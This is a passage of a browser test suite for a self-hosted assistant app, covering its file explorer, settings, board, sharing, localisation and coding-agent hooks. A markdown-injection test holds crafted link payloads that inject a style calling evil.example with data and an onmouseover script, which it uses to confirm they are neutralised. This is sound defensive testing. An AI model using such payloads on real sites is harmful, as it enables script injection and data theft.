    await page.click('#lib-list .lib-row[data-id]', { button: 'right' }); await page.waitForTimeout(150);
    check('explorer: right click opens the file menu and selects the row', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('Rename') && await page.isVisible('#lib-selbar'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(100);
    await page.click('#lib-sel-clear');
    await page.click('#lib-list', { button: 'right', position: { x: 5, y: 3 } }).catch(() => {}); await page.keyboard.press('Escape');
    await page.focus('#lib-list .lib-row[data-id]'); await page.keyboard.press('Control+a'); await page.waitForTimeout(150);
    check('explorer: Ctrl+A selects every file', (await page.textContent('#lib-sel-n')).startsWith('2'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(100);
    await page.keyboard.press('ArrowDown'); await page.waitForTimeout(100);
    check('explorer: arrow keys move between rows', await page.evaluate(() => document.activeElement.classList.contains('lib-row')));
    // 1.24.0: folder dates, pins, everything below, folders in a selection
    await page.evaluate(async () => { await fetch('api/library/folder', { method: 'POST', headers: { 'X-Talixio': '1', 'content-type': 'application/json' }, body: JSON.stringify({ path: '/Explorer/Sub' }) });
      const fd = new FormData(); fd.append('file', new File(['deep'], 'deep.md')); fd.append('folder', '/Explorer/Sub'); await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd }); });
    await page.evaluate(() => { location.hash = '#library'; }); await page.waitForTimeout(500);
    await page.evaluate(() => { location.hash = '#library/Explorer'; }); await page.waitForTimeout(900);
    check('explorer: a folder row shows the date of its newest file', (await page.textContent('#lib-list .lib-folder .c-mod')).trim().length > 0);
    await page.click('#lib-view-btn'); await page.click('.lib-pop [data-flat="1"]'); await page.waitForTimeout(500);
    check('explorer: Everything below lists the files of subfolders too, with their folder', (await names()).includes('deep.md') && !(await page.isVisible('#lib-list .lib-folder')));
    await page.click('.lib-pop [data-flat=""]'); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    check('explorer: This folder brings the subfolders back', await page.isVisible('#lib-list .lib-folder') && !(await names()).includes('deep.md'));
    await page.click('#lib-list .lib-folder .pick'); await page.waitForTimeout(150);
    check('explorer: a folder can be selected; the bar offers zip and move but not delete', await page.isVisible('#lib-selbar') && !(await page.isVisible('#lib-sel-del')) && (await page.getAttribute('#lib-sel-zip', 'href')).includes('paths=%2FExplorer%2FSub'));
    await page.click('#lib-sel-clear');
    await page.click('#lib-list .lib-folder .kebab'); await page.click('.row-menu-item:has-text("Pin to the tree")'); await page.waitForTimeout(200);
    check('explorer: a pinned folder appears in the tree favourites', await page.isVisible('.tree-pins a[data-path="/Explorer/Sub"]'));
    await page.click('.tree-pins [data-unpin]'); await page.waitForTimeout(150);
    check('explorer: and can be unpinned', !(await page.isVisible('.tree-pins')));
    // slice 5: preview pane
    check('explorer: the preview pane is off by default', !(await page.isVisible('#lib-prev')));
    await page.click('#lib-prev-btn'); await page.waitForTimeout(150);
    check('explorer: the preview button opens an empty pane', await page.isVisible('#lib-prev') && (await page.textContent('#lib-prev')).includes('Select a file'));
    await page.click('#lib-list .lib-row[data-id] .name'); await page.waitForTimeout(500);
    check('explorer: a click previews the file instead of opening it', await page.isVisible('#lib-prev h3') && !(await page.isVisible('#viewer')) && await page.isVisible('#lib-list .lib-row.cur'));
    check('explorer: the pane shows an excerpt of a text file', await page.isVisible('#lib-prev .lib-prev-text'));
    await page.dblclick('#lib-list .lib-row[data-id] .name'); await page.waitForTimeout(500);
    check('explorer: a double click opens the file', await page.isVisible('#viewer'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(300);
    await page.click('#lib-prev-btn'); await page.waitForTimeout(100);
    check('explorer: the pane closes again', !(await page.isVisible('#lib-prev')));
    await page.reload(); await page.waitForTimeout(900);
    await page.setViewportSize({ width: 390, height: 780 }); await page.waitForTimeout(200);
    check('explorer mobile: no column header, list starts under 130 px', !(await page.isVisible('.lib-cols')) && (await page.evaluate(() => document.querySelector('#lib-list').getBoundingClientRect().top)) < 190);
    await page.click('#lib-list .lib-row[data-id] .ico'); await page.waitForTimeout(150);
    check('explorer mobile: tapping the icon selects', await page.isVisible('#lib-selbar'));
    await page.click('#lib-sel-clear');
    await page.setViewportSize({ width: 1280, height: 860 }); await page.waitForTimeout(100);
  },
  async libraryMemory({ page, check }) {
    await go(page, 'settings');
    // Bibliothèque et mémoire: Search, Documents, Network drive; the knowledge graph lives in its own Learning section.
    await page.evaluate(() => { location.hash = '#settings/library'; }); await page.waitForTimeout(700);
    const libTabs = await page.$$eval('.set-sec[data-sec="library"] .set-tabs .tab', els => els.map(e => e.textContent.trim()));
    check('settings: Library and memory has Search, Documents and Network drive tabs', libTabs.length === 3 && /search|recherche/i.test(libTabs[0]) && /documents/i.test(libTabs[1]) && /drive|réseau/i.test(libTabs[2]), libTabs.join('|'));
    check('settings: Search shows the model in use and a way to choose it, not the old list of presets',
      await page.isVisible('#meaning [data-a="choose"]') && (await page.$$('#meaning .meaning-opt')).length === 0);
    await page.click('.set-sec[data-sec="library"] .set-tabs .tab:nth-child(2)');
    check('settings: Documents holds filing and image reading, and no transcription fields',
      await page.isVisible('#set-TALIXIO_AUTO_FILE') && await page.isVisible('#set-TALIXIO_VISION_INDEX') && !(await page.isVisible('#set-TALIXIO_TRANSCRIBE')));
    await page.evaluate(() => { location.hash = '#settings/learning'; }); await page.waitForTimeout(700);
    check('settings: the knowledge graph is in the Learning section', await page.isVisible('#set-TALIXIO_GRAPH') || await page.isVisible('.set-sec[data-sec="learning"] [data-key="TALIXIO_GRAPH"]'));
  },
  async sites({ page, check }) {
    await go(page, 'settings');
    await page.evaluate(() => { location.hash = '#settings/security'; }); await page.waitForTimeout(700);
    const box = '.field[data-key="TALIXIO_WEB_TRUSTED"] .sites';
    await page.click('.set-sec[data-sec="security"] .set-tabs .tab:has-text("Browser")');
    await page.waitForSelector(box, { timeout: 10000 });
    await page.fill(`${box} [data-site-new]`, 'https://www.LeMonde.fr/some/page');
    await page.press(`${box} [data-site-new]`, 'Enter');
    await page.fill(`${box} [data-site-new]`, 'gouv.fr'); await page.click(`${box} [data-site-add]`);
    check('sites: a full address is added as the bare site, listed as chips', JSON.stringify(await page.$$eval(`${box} .site-chip`, e => e.map(x => x.firstChild.textContent.trim()).sort())) === '["gouv.fr","lemonde.fr"]');
    check('sites: the Save bar appears', await page.isVisible('#set-save'));
    await page.fill(`${box} [data-site-new]`, 'not a site!'); await page.click(`${box} [data-site-add]`);
    check('sites: something that is not a site is refused with a message', await page.isVisible(`${box} [data-site-err]`) && (await page.$$(`${box} .site-chip`)).length === 2);
    await page.fill(`${box} [data-site-find]`, 'gouv');
    check('sites: the search filters the chips', (await page.$$(`${box} .site-chip`)).length === 1);
    await page.fill(`${box} [data-site-find]`, '');
    await page.click(`${box} [data-rm="gouv.fr"]`);
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    const val = async k => (await api(page, 'api/settings')).groups.flatMap(g => g.fields).find(f => f.key === k).value;
    check('sites: saved on the server, normalised', await val('TALIXIO_WEB_TRUSTED') === 'lemonde.fr');
    const chipsOf = async () => JSON.stringify(await page.$$eval(`${box} .site-chip`, e => e.map(x => x.firstChild.textContent.trim()).sort()));
    check('sites: after saving, the saved site is still shown', await chipsOf() === '["lemonde.fr"]', await chipsOf());
    await page.reload(); await page.evaluate(() => { location.hash = '#settings/security'; }); await page.waitForTimeout(700);
    await page.click('.set-sec[data-sec="security"] .set-tabs .tab:has-text("Browser")'); await page.waitForSelector(box, { timeout: 10000 });
    check('sites: on opening the page again, the saved sites are shown', await chipsOf() === '["lemonde.fr"]', await chipsOf());
    await page.fill(`${box} [data-site-new]`, 'gouv.fr'); await page.click(`${box} [data-site-add]`);
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    check('sites: a site added later keeps the ones saved before', await val('TALIXIO_WEB_TRUSTED') === 'lemonde.fr,gouv.fr' || await val('TALIXIO_WEB_TRUSTED') === 'gouv.fr,lemonde.fr', await val('TALIXIO_WEB_TRUSTED'));
    await page.fill('.field[data-key="TALIXIO_WEB_BLOCKED"] [data-site-new]', 'tracker.example'); await page.click('.field[data-key="TALIXIO_WEB_BLOCKED"] [data-site-add]');
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    check('sites: the blocked list is saved on its own', await val('TALIXIO_WEB_BLOCKED') === 'tracker.example');
  },
  async notifications({ page, check }) {
    await go(page, 'notifications');
    for (const b of ['#notif-all-read', '#notif-clear']) if (await page.isVisible(b) && await page.isEnabled(b)) await page.click(b);
    await page.waitForTimeout(400);
    check('notifications: the buttons work', true);
  },
  async boardViews({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board [data-mode=list]'); await page.waitForTimeout(500);
    await page.fill('#view-board .qa-in', 'Call Alex tomorrow 9am p1 #sales');
    await page.waitForTimeout(200);
    check('quick add: the date and priority are read', (await page.textContent('#view-board .qa-chips')).length > 0);
    await page.press('#view-board .qa-in', 'Enter');
    await page.waitForTimeout(800);
    check('quick add: the task shows in the list', (await page.textContent('#view-board')).includes('Call Alex'));
    for (const m of ['today', 'week', 'calendar', 'overall', 'board']) {
      await page.click(`#view-board [data-mode=${m}]`); await page.waitForTimeout(600);
      check(`board: the ${m} view shows`, (await page.textContent('#view-board')).length > 0);
    }
    await page.click('#view-board .kcard');
    await page.waitForSelector('#card-dialog[open]');
    await page.fill('#cd-title', 'Call Alex about the renewal');
    await page.selectOption('#cd-status', { index: 2 });
    await page.click('#card-form [type=submit]');
    await page.waitForTimeout(800);
    check('board: the edited card is saved', (await page.textContent('#view-board')).includes('about the renewal'));
  },
  async chatSearch({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', 'remember the kiwi order');
    await page.click('#send');
    await page.waitForSelector('#thread :text("kiwi order")');
    await page.click('#chat-search-btn');
    await page.fill('#chat-search-q', 'kiwi');
    await page.waitForTimeout(1200);
    check('chat search: the message is found', (await page.textContent('#chat-search-results')).includes('kiwi'));
    await page.keyboard.press('Escape');
  },
  async jobs({ page, check, root, data }) {
    // with no directive yet, the section shows a discoverable one-line hint rather than nothing
    await go(page, 'jobs');
    await page.waitForSelector('#directives .dir-hint', { timeout: 5000 });
    check('jobs: an empty directives section hints how to start a team', (await page.textContent('#directives .dir-hint')).includes('No directives yet'));
    // seed a directive with two workers directly in the shared store, as the director would
    const php = "$a=\\Talixio\\App::fromEnv();$d=$a->store->addDirective('Browser directive','compare and draft',1,0);"
      + "$w1=$a->store->addJob('researcher: compare','i','standard',1,'worker',null,0,[],'',null,'',$d,'researcher');"
      + "$w2=$a->store->addJob('writer: draft','i','fast',1,'worker',null,0,[],'',null,'',$d,'writer');"
      + "$a->store->updateJob($w1,['status'=>'done','cost_usd'=>0.4]);$a->store->updateJob($w2,['status'=>'running']);";
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';" + php],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await page.reload(); await page.waitForTimeout(500); // already on #jobs, so a hash change won't refetch — reload to pick up the seed
    await page.waitForSelector('#directives .task.dir', { timeout: 5000 });
    check('jobs: a directive shows as a row with its workers', (await page.textContent('#directives')).includes('Browser directive'));
    await page.click('#directives .task.dir .dir-exp'); await page.waitForTimeout(200);
    check('jobs: the directive expands to show its worker roles', /researcher/.test(await page.textContent('#directives .dir-workers')));
    check('jobs: the in-thread directive bar is activated while a worker runs', (await page.getAttribute('#dir-bar', 'hidden')) === null);
    check('voice: a dictation mic sits on the composer', await page.locator('#composer .dictate-btn[data-dictate-for="input"]').count() === 1);
    await page.fill('#jobs-search', 'x'); await page.waitForTimeout(400); await page.fill('#jobs-search', '');
    await page.click('#jobs-archived'); await page.waitForTimeout(400);
    check('jobs: the filters work', true);
  },
  async french({ browser, base, check }) {
    const ctx = await browser.newContext({ locale: 'fr-FR' }), p = await ctx.newPage();
    await p.goto(base + '/');
    await p.fill('#password', 'pw'); await p.press('#password', 'Enter');
    await p.waitForSelector('#shell:not([hidden])');
    await p.evaluate(() => { location.hash = '#library'; }); await p.waitForTimeout(800);
    check('french: the interface is translated', /Bibliothèque|Corbeille|Nouveau/.test(await p.textContent('body')));
    await ctx.close();
    // the account menu's "Langue" pins a language that persists: an English browser, pinned to French, must come up in French
    const ctx2 = await browser.newContext({ locale: 'en-US' }), p2 = await ctx2.newPage();
    await p2.goto(base + '/');
    await p2.evaluate(() => { try { const b = new URL(document.baseURI).pathname.replace(/\/$/, ''); localStorage.setItem((b ? b.slice(1) + ':' : '') + 'talixio.lang', 'fr'); } catch {} });
    await p2.goto(base + '/');
    await p2.fill('#password', 'pw'); await p2.press('#password', 'Enter');
    await p2.waitForSelector('#shell:not([hidden])');
    await p2.evaluate(() => { location.hash = '#library'; }); await p2.waitForTimeout(800);
    check('french: a pinned language overrides the browser default and persists across reloads',
      /Bibliothèque|Corbeille|Nouveau/.test(await p2.textContent('body')));
    await ctx2.close();
  },
  async oauthLink({ page, base, check }) {
    // audit, lot 6: a link made elsewhere, as if back from a sign-in page, cannot show its own words in the app
    await page.goto(base + '/?google=' + encodeURIComponent('Your account is locked: call 555-0100') + '#chat');
    await page.waitForSelector('#shell:not([hidden])'); await page.waitForTimeout(1200);
    const shown = await page.evaluate(() => document.querySelector('#toast')?.textContent || '');
    check('oauth: the words of a forged sign-in link are not shown', !shown.includes('555'), shown);
    check('oauth: the address is cleaned', !(await page.evaluate(() => location.search)).includes('google'));
  },
  async firstLook({ browser, base, check }) {
    // audit 5.1: what a French user sees first, the language pinned as the account menu does
    const ctx = await browser.newContext({ locale: 'fr-FR' }), p = await ctx.newPage();
    await p.goto(base + '/');
    await p.evaluate(() => { try { const b = new URL(document.baseURI).pathname.replace(/\/$/, ''); localStorage.setItem((b ? b.slice(1) + ':' : '') + 'talixio.lang', 'fr'); } catch {} });
    const refused = []; p.on('response', r => { if (r.status() === 401) refused.push(new URL(r.url()).pathname); });
    await p.goto(base + '/'); await p.waitForSelector('#password'); await p.waitForTimeout(500);
    check('first look: the sign-in page asks the server nothing it would refuse (audit U14)', refused.length === 0, refused.join(' '));
    await p.fill('#password', 'pw'); await p.press('#password', 'Enter');
    await p.waitForSelector('#shell:not([hidden])');
    await p.evaluate(() => { location.hash = '#library'; }); await p.waitForTimeout(600); await p.evaluate(() => { location.hash = '#chat'; }); await p.waitForTimeout(1500);
    const ph = await p.getAttribute('#input', 'placeholder');
    check('first look: the message box says "Écrire à …" once, not translated twice (audit U3)', /^Écrire à /.test(ph) && !/à à/.test(ph), ph);
    await p.evaluate(() => { location.hash = '#memory'; }); await p.waitForTimeout(800);
    check('first look: Memory lists no role among the skills, so no "Delete" on the protected assessor (audit U13)', !(await p.textContent('#skills')).includes('assessor'));
    await ctx.close();
  },
  async keyboard({ page, check }) {
    // audit 5.5: a menu takes the keyboard when it opens, the arrows move in it; Pilotage's tabs name their panels
    await go(page, 'chat');
    await page.focus('#account-btn'); await page.keyboard.press('Enter'); await page.waitForTimeout(300);
    const first = await page.evaluate(() => [document.activeElement?.closest('#account-menu') !== null, document.activeElement?.getAttribute('role'), document.activeElement?.textContent.trim()]);
    check('keyboard: the account menu takes the focus when it opens, on an item that says it is one', first[0] && first[1] === 'menuitem', JSON.stringify(first));
    await page.keyboard.press('ArrowDown'); await page.waitForTimeout(100);
    const next = await page.evaluate(() => document.activeElement?.textContent.trim());
    check('keyboard: the arrow moves to the next item', next !== first[2] && await page.evaluate(() => document.activeElement?.closest('#account-menu') !== null), next);
    await page.keyboard.press('Escape'); await page.waitForTimeout(200);
    await go(page, 'pilotage');
    const tabs = await page.evaluate(() => [...document.querySelectorAll('.ptab')].every(t => { const p = document.getElementById(t.getAttribute('aria-controls') || '-'); return p && p.getAttribute('role') === 'tabpanel'; }));
    check('keyboard: each Pilotage tab names the panel it shows', tabs);
  },
  async previewTracking({ browser, base, check }) {
    // audit S16: a saved page or an email with a picture from outside: previewing it loads nothing from outside.
    // Its own page: the blocked requests are written in that page's console, which is the point here.
    const ctx = await browser.newContext(), page = await ctx.newPage();
    await page.goto(base + '/'); await page.fill('#password', 'pw'); await page.press('#password', 'Enter'); await page.waitForSelector('#shell:not([hidden])');
    const sent = [];
    const spy = r => { if (r.url().includes('tracker.example') && r.failure()?.errorText !== 'csp') sent.push(r.url() + ' ' + (r.failure()?.errorText || 'loaded')); };
    page.on('requestfinished', spy); page.on('requestfailed', spy);
    const id = await page.evaluate(async () => {
      const fd = new FormData();
      fd.append('file', new File(['<html><head><title>News</title></head><body><p>Hello</p><img src="https://tracker.example/open.gif?who=me"><link rel="stylesheet" href="https://tracker.example/s.css"></body></html>'], 'newsletter.html', { type: 'text/html' }));
      fd.append('folder', '/Inbox');
      const r = await (await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd })).json();
      return r.id || r.file?.id;
    });
    await page.evaluate(async id => {
      const f = document.createElement('iframe'); f.sandbox = 'allow-popups'; document.body.appendChild(f);
      f.srcdoc = (await (await fetch(`api/files/${id}/preview`)).json()).html;
    }, id);
    await page.waitForTimeout(1200);
    check('preview: a page with a picture from outside shows without loading it', sent.length === 0, sent.join(' '));
    await ctx.close();
  },
  async files({ page, check }) {
    const closeAll = () => page.evaluate(() => document.querySelectorAll('dialog[open]').forEach(d => d.close()));
    await go(page, 'library');
    await page.click('#lib-tree >> text=Inbox'); await page.waitForTimeout(600);
    await page.click('#lib-list >> text=Idea for the newsletter'); await page.waitForTimeout(800);
    check('files: the note opens', (await page.textContent('#viewer-body')).includes('newsletter'));
    for (const b of ['#viewer-share', '#viewer-move', '#viewer-rename']) {
      await page.click('#viewer-more').catch(() => {});
      if (await page.isVisible(b)) { await page.click(b); await page.waitForTimeout(600); await closeAll(); }
    }
    await page.click('#viewer-close').catch(() => {});
    await go(page, 'library');
    await page.fill('#lib-q', 'newsletter'); await page.press('#lib-q', 'Enter'); await page.waitForTimeout(1200);
    check('files: the search finds the note', (await page.textContent('#view-library')).includes('newsletter'));
  },
  async boardActions({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board [data-mode=list]'); await page.waitForTimeout(500);
    await page.click('#view-board .tl-head input[type=checkbox]');
    check('list: selecting shows the bulk bar', await page.isVisible('#list-bulk'));
    await page.click('#view-board .tl-head input[type=checkbox]');
    await page.click('#view-board [data-mode=board]'); await page.waitForTimeout(500);
    await page.click('#view-board .kcard .kmore'); await page.waitForTimeout(500);
    check('board: the card menu opens', await page.isVisible('#move-sheet'));
    await page.keyboard.press('Escape');
  },
  async settingsSave({ page, check }) {
    await go(page, 'settings');
    // nothing touched: no "unsaved change" (it used to show one for a server value the list does not offer: audit U12)
    check('settings: opening them shows no unsaved change', await page.isHidden('#set-save'));
    await page.fill('#set-search', 'heartbeat'); await page.waitForTimeout(400);
    const f = page.locator('#set-TALIXIO_HEARTBEAT_MINUTES');
    await f.fill(String((+(await f.inputValue()) || 0) + 30)); await f.dispatchEvent('input'); await page.waitForTimeout(200);
    check('settings: a change shows the save bar', await page.isVisible('#set-save'));
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    check('settings: saving works', await page.isHidden('#set-save'));
    await page.fill('#set-search', ''); await page.waitForTimeout(200);
  },
  async markdown({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', '# Plan\n\n**bold** and `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```\nx = 1\n```');
    await page.click('#send');
    await page.waitForSelector('#thread table', { timeout: 10000 }).catch(() => {});
    check('markdown: lists, code and tables render', await page.evaluate(() => { const h = [...document.querySelectorAll('#thread .msg')].pop()?.innerHTML || ''; return ['<strong>', '<li>', '<table>', '<code>'].every(t => h.includes(t)); }));
  },
  async markdownInjection({ page, check }) {
    // audit S1: a placeholder of a first link must never be expanded inside the href of a second one
    const outside = [];
    const spy = r => { if (!r.url().startsWith(new URL(page.url()).origin) && !r.url().startsWith('data:')) outside.push(r.url()); };
    page.on('request', spy);
    const payloads = [
      '[a](https://evil.example/[b](tel:/style=position:fixed;inset:0;z-index:99999;background:url\\(https://evil.example/px?d=DATA\\);x:))',
      '[a](https://evil.example/`x`onmouseover=alert(1)//)',
      '[a](https://evil.example/\u00000\u0000)',
      '[a](#library/\\)x)',
    ];
    const res = await page.evaluate(ps => {
      const boxes = ps.map(p => { const b = document.createElement('div'); b.className = 'md-probe doc'; b.innerHTML = md(p); document.body.appendChild(b); return b; });
      const out = boxes.map(b => [...b.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.name)).filter(n => n === 'style' || n.startsWith('on')));
      const box = document.createElement('div'); box.className = 'md-probe'; document.body.appendChild(box);
      box.innerHTML = md('see [the doc](https://example.org/a) and **[bold link](https://example.org/b)**');
      const links = [...box.querySelectorAll('a')].map(a => [a.getAttribute('href'), a.closest('strong') ? 'b' : '', a.textContent]);
      return { out, links };
    }, payloads);
    await page.waitForTimeout(800); // the rendered payloads stay on screen: a background image would load now
    page.off('request', spy);
    await page.evaluate(() => document.querySelectorAll('.md-probe').forEach(b => b.remove()));
    check('markdown: no style or on* attribute comes out of a crafted link', res.out.every(a => a.length === 0), JSON.stringify(res.out));
    check('markdown: a crafted link sends no request to another host', outside.length === 0, outside.join(' '));
    check('markdown: a plain link and a link in bold still render', JSON.stringify(res.links) === JSON.stringify([['https://example.org/a', '', 'the doc'], ['https://example.org/b', 'b', 'bold link']]), JSON.stringify(res.links));
  },
  async shareTarget({ page, check, base }) {
    // audit S2: a share is only stored once the user says yes in the app
    const url = await page.evaluate(async () => {
      const fd = new FormData(); fd.append('text', 'shared words'); fd.append('files', new File(['hello'], 'shared-probe.txt', { type: 'text/plain' }));
      return (await fetch('share', { method: 'POST', body: fd })).url;
    });
    check('share: posting from the app gives a share link', /[?&]share=[a-f0-9]{32}/.test(url), url);
    const inInbox = async () => JSON.stringify(await api(page, 'api/library?folder=/Inbox')).includes('shared-probe.txt');
    await page.goto(url);
    await page.waitForSelector('#banner:not([hidden]) #banner-action:not([hidden])', { timeout: 8000 });
    const asked = await page.textContent('#banner-text');
    check('share: the app asks before adding, and names the files', asked.includes('shared-probe.txt'), asked);
    check('share: nothing is in the inbox nor in the message box before the user agrees',
      !(await inInbox()) && (await page.inputValue('#input')) === '' && await page.isHidden('#pending-files'));
    await page.click('#banner-action');
    await page.waitForSelector('#pending-files:not([hidden])', { timeout: 8000 });
    check('share: once agreed, the file is attached and the text prefilled', await inInbox() && (await page.inputValue('#input')).includes('shared words')
      && (await page.textContent('#pending-files')).includes('shared-probe.txt'));
    await page.fill('#input', ''); await page.evaluate(() => { state.pending.length = 0; renderPending(); });
  },
  async cardText({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board .kcard');
    await page.waitForSelector('#card-dialog[open]');
    await page.click('#cd-rte [contenteditable]');
    await page.keyboard.type('First step: call Sam');
    await page.keyboard.press('Enter');
    await page.keyboard.type('- check the price');
    await page.click('#card-form [type=submit]'); await page.waitForTimeout(800);
    await page.click('#view-board .kcard'); await page.waitForSelector('#card-dialog[open]');
    check('card: the description is kept', (await page.textContent('#cd-rte')).includes('call Sam'));
  },
  async shareLink({ page, check }) {
    await go(page, 'library');
    await page.click('#lib-tree >> text=Inbox'); await page.waitForTimeout(600);
    await page.click('#lib-list >> text=Idea for the newsletter'); await page.waitForTimeout(800);
    await page.click('#viewer-more').catch(() => {});
    await page.click('#viewer-share'); await page.waitForSelector('#share-dialog[open]');
    await page.fill('#sh-label', 'For Sam');
    await page.click('#sh-form [type=submit]'); await page.waitForTimeout(800);
    check('share: the link is made', (await page.textContent('#share-dialog')).includes('For Sam'));
  },
  async spaceEdit({ page, check }) {
    await go(page, 'chat');
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=edit]');
    await page.waitForSelector('#space-dialog[open]');
    await page.fill('#sp-instructions', 'Answer briefly.');
    await page.click('#space-form [type=submit]'); await page.waitForTimeout(800);
    check('spaces: the instructions are saved', JSON.stringify(await api(page, 'api/spaces')).includes('Answer briefly.'));
    // 1.45.0: the cloud orchestrator's panel is gone from the space editor
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=edit]');
    await page.waitForSelector('#space-dialog[open]');
    check('spaces: the retired orchestrator panel is gone from the editor', !(await page.$('#sp-orch-row')) && !(await page.$('#sp-orch-connect')));
    await page.click('#sp-cancel');
  },
  async siteApis({ page, check, data }) {
    // 1.37.0: connectors learned from a site's API are listed in Settings, with their key and Remove
    const ep = (name, method, path, description) => ({ name, method, path, description, params: {}, fixed: {}, changes: false });
    writeFileSync(join(data, 'site-apis.json'), JSON.stringify({ apis: {
      shop: { name: 'shop', title: 'Test Shop', base: 'https://shop.example/api', auth: { type: 'header', name: 'X-Api-Key', prefix: '', help: 'Account, then Developer' }, key: '', at: 1,
        endpoints: [ep('search', 'GET', '/products', 'Search products'), ep('add_to_cart', 'POST', '/cart', 'Add to the cart')] },
      mine: { name: 'mine', title: 'My Orders', base: 'https://orders.example', auth: { type: 'cookies', help: '' }, key: '', at: 1, endpoints: [ep('orders', 'GET', '/api/orders', 'My orders')] } } }));
    await page.evaluate(() => localStorage.setItem('setTab:accounts', 'mcp-card'));
    await go(page, 'settings/accounts');
    await page.waitForSelector('#sapi-list [data-sapi=shop]', { timeout: 8000 });
    const shop = () => page.textContent('#sapi-list [data-sapi=shop]');
    check('site apis: Settings lists the learned connectors with their site, sign-in and what runs without asking',
      await page.isVisible('#sapi') && /shop\.example/.test(await shop()) && /2 outil|2 tool/.test(await shop()) && /1 (sans demander|run without)/.test(await shop()), await shop());
    check('site apis: one without its key is flagged', await page.$eval('#sapi-list [data-sapi=shop]', el => el.classList.contains('bad')));
    await page.click('#sapi-list [data-sapi=shop] summary');
    check('site apis: opened, it shows each call and that changes ask first', /POST \/cart/.test(await shop()) && /(demande d'abord|asks first)/.test(await shop()) && /Account, then Developer/.test(await shop()));
    await page.fill('#sapi-list [data-sapi=shop] [data-sapikey]', 'k-123');
    await page.click('#sapi-list [data-sapi=shop] [data-sapisave]');
    await page.waitForFunction(() => !document.querySelector('#sapi-list [data-sapi=shop]').classList.contains('bad'), null, { timeout: 6000 });
    const list = await api(page, 'api/site-apis');
    check('site apis: the key is saved, and never sent back to the page', list.apis.find(a => a.name === 'shop').has_key === true && !JSON.stringify(list).includes('k-123'));
    page.once('dialog', d => d.accept());
    await page.click('#sapi-list [data-sapi=mine] summary');
    check('site apis: a cookie one says it uses the browser login and asks to log in again when it expires', /(navigateur de l'assistant|assistant's browser)/.test(await page.textContent('#sapi-list [data-sapi=mine]')));
    await page.click('#sapi-list [data-sapi=mine] [data-sapidel]');
    await page.waitForFunction(() => !document.querySelector('#sapi-list [data-sapi=mine]'), null, { timeout: 6000 });
    check('site apis: Remove takes it away', (await api(page, 'api/site-apis')).apis.map(a => a.name).join() === 'shop');
  },

  async agentBoard({ page, check, data }) {
    // 1.36.0: a coding agent reports itself through the hook script; the board shows its own words and sends answers back
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    check('agent board: three columns, Needs you, Working and Quiet', (await page.$$('#ab-cols .ab-col')).length === 3);
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.waitForFunction(() => /PermissionRequest/.test(document.querySelector('#ab-snippet').textContent), null, { timeout: 6000 });
    check('agent board: Connect a machine shows the hooks to add', /asyncRewake/.test(await page.textContent('#ab-snippet')));
    await page.fill('#ab-machine', 'testbox');
    // 1.48.0: one command installs it all; run here in a home folder of its own
    const rootsHidden = await page.isHidden('#ab-roots'); await page.check('#ab-listen');
    check('agent board: the folders the listener may use are asked only with the listener', rootsHidden && await page.isVisible('#ab-roots'));
    await page.fill('#ab-roots', '~:/app/projects');
    check('agent board: the listener download carries those folders', /roots=~%3A%2Fapp%2Fprojects/.test(await page.getAttribute('#ab-dl-listen', 'href')));
    await page.fill('#ab-roots', ''); await page.uncheck('#ab-listen');
    await page.click('#ab-cmd-get');
    await page.waitForSelector('#ab-cmd-box:not([hidden])', { timeout: 6000 });
    const cmd = await page.textContent('#ab-cmd');
    check('agent board: Get the install command gives a one-line curl … | sh', /^curl -fsSL 'http[^']+\/api\/agents\/install\?c=[\w-]+' \| sh$/.test(cmd), cmd);
    const home = join(data, 'install-home'); mkdirSync(home, { recursive: true });
    let installed = '';
    try { installed = execFileSync('sh', ['-c', cmd], { env: { ...process.env, HOME: home }, stdio: ['ignore', 'pipe', 'pipe'] }).toString(); } catch (e) { installed = 'FAILED ' + e.stderr; }
    const settings = existsSync(join(home, '.claude/settings.json')) ? readFileSync(join(home, '.claude/settings.json'), 'utf8') : '';
    check('agent board: the command installs the script and the hooks for this machine', /PermissionRequest/.test(settings)
      && /M='testbox'/.test(readFileSync(join(home, '.talixio/agent-hook.sh'), 'utf8')) && /Done\./.test(installed), installed);
    check('agent board: « Work without asking » is ticked by default, and the command sets the mode (1.54.0)', await page.isChecked('#ab-noask')
      && /"defaultMode": "(auto|acceptEdits)"/.test(settings) && /"Bash\(git push:\*\)"/.test(settings), settings);
    const script = await page.evaluate(() => fetch(document.querySelector('#ab-dl').getAttribute('href')).then(r => r.text()));
    check('agent board: the script downloads with the machine name', /M='testbox'/.test(script) && /^U='http/m.test(script), script.slice(0, 400));
    const sh = join(data, 'agent-hook.sh'); writeFileSync(sh, script);
    const run = (mode, ev) => new Promise(res => {
      const p = spawn('sh', [sh, mode], { env: { ...process.env, TALIXIO_WAIT: '20' } }); let out = '', err = '';
      p.stdout.on('data', d => out += d); p.stderr.on('data', d => err += d); p.on('close', code => res({ code, out, err }));
      p.stdin.end(JSON.stringify({ session_id: 'bt-1', cwd: '/work/webshop', ...ev }));
    });
